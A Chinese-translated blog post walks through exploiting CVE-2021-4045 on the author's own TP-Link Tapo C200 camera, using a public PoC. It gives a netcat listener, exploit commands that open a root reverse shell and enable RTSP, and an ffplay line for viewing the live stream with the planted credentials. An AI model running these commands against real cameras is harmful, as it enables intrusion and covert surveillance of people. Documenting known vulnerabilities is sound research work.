<html>
<head>
<title>Hacking into Wi-Fi Camera TP-Link Tapo C200 (CVE-2021–4045)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">入侵Wi-Fi摄像头TP-Link Tapo C200(CVE-2021–4045)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hacking-into-wi-fi-camera-tp-link-tapo-c200-cve-2021-4045-4c4e43115864?source=collection_archive---------1-----------------------#2022-12-08">https://infosecwriteups.com/hacking-into-wi-fi-camera-tp-link-tapo-c200-cve-2021-4045-4c4e43115864?source=collection_archive---------1-----------------------#2022-12-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/57989af6388066335cfa1a2a5d2fd24b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v1HGqQwhlTiemIV0Wyvqlw.png"/></div></div></figure><p id="56f8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有一天，在例行的每日漏洞数据库读取期间，我发现了一个有趣的漏洞(CVE-2021–4045 ),是关于我自己的Wi-Fi摄像头的。我很久以前买了这个相机，用来在我的宝宝睡觉时监控他。这台相机在壁橱里放了很长时间，所以我敢肯定固件有一段时间没有升级，我很有可能这个CVE影响了我的固件版本。我发现我的相机固件版本是1.1.11。不错，让摇滚，漏洞影响1.1.16 Build 211209 Rel之前的所有固件版本。37726N，所以我应该很容易黑进我的。</p><p id="e905" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我不会深究这个漏洞的作者(<a class="ae kw" href="https://twitter.com/hacefresko" rel="noopener ugc nofollow" target="_blank"> Victor Fresk0 </a>)是如何完成伟大的逆向工程的整个故事。如果你有兴趣详细研究，查看下面的<a class="ae kw" href="https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce" rel="noopener ugc nofollow" target="_blank">链接</a>。我将向您展示，由于uhttpd中对用户输入的检查不足，使用命令注入可以轻松完成RCE和流。</p><p id="3bec" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">所以，我们开始吧。首先，我检查并读出了我在<a class="ae kw" href="https://github.com/hacefresko/CVE-2021-4045-PoC" rel="noopener ugc nofollow" target="_blank"> github </a>上找到的源代码。</p><figure class="kx ky kz la gt jr"><div class="bz fp l di"><div class="lb lc l"/></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">代码已经根据我的需要修改了NC_COMMAND。</figcaption></figure><p id="9b26" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">第一次尝试时，我遇到了一个错误。我在代码中遇到了NC_COMMAND的问题。我在代码中对这个netcat命令做了一些调整，并按照我所知道的它在Linux Parrot OS中通常适用的方式进行了修改。</p><pre class="kx ky kz la gt lh li lj bn lk ll bi"><span id="dbbe" class="lm ln iq li b be lo lp l lq lr">NC_COMMAND = 'nc -lvp %d' % PORT</span></pre><p id="9e8a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后我再次尝试这个命令，它成功了。</p><p id="51ae" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">RCE司令部:</p><pre class="kx ky kz la gt lh li lj bn lk ll bi"><span id="54ef" class="lm ln iq li b be lo lp l lq lr">sudo python3 tapo.py shell 192.168.64.103 192.168.64.101</span></pre><p id="f507" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="ls">记得更改相机和PC的IP。在我的例子中，192.168.64.101是相机的IP，192.168.64.103是PC的IP。</em></p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/09114a3cce811213868559809297f082.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IX7_Cm7ps-JgBBIoiGmN6w.png"/></div></div></figure><p id="0265" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如您所见，我收到了root用户id的shell。</p><p id="f7b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后我还尝试了rtsp(实时流协议),它可以访问实时视频流。</p><pre class="kx ky kz la gt lh li lj bn lk ll bi"><span id="0191" class="lm ln iq li b be lo lp l lu lr">sudo python3 tapo.py rtsp 192.168.64.103 192.168.64.101</span></pre><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/b45ecb2bf3dbc4d18f4312dbdb8dc1ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HJkItTLqseig4-O_sA8Pjw.png"/></div></div></figure><p id="8be7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这段代码的执行将为您提供所需的rtsp链接和凭证。对于流媒体，你可以使用任何支持rtsp协议的播放器。在我的例子中，我使用了播放器ffplay。</p><p id="48a4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">接下来我运行代码:</p><pre class="kx ky kz la gt lh li lj bn lk ll bi"><span id="a8ea" class="lm ln iq li b be lo lp l lu lr">sudo ffplay rtsp://pwned1337:pwned1337@192.168.64.103/stream2</span></pre><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/9620c0092e715aaead1106638a3f1491.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EDypi36vs75iP9ovx1ycBA.png"/></div></div></figure><p id="1df4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">开始了，我播放了我的TP-Link Tapo C200的视频。</p></div><div class="ab cl lv lw hu lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="ij ik il im in"><h2 id="8e86" class="mc ln iq bd md me mf dn mg mh mi dp mj kj mk ml mm kn mn mo mp kr mq mr ms mt bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kw" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>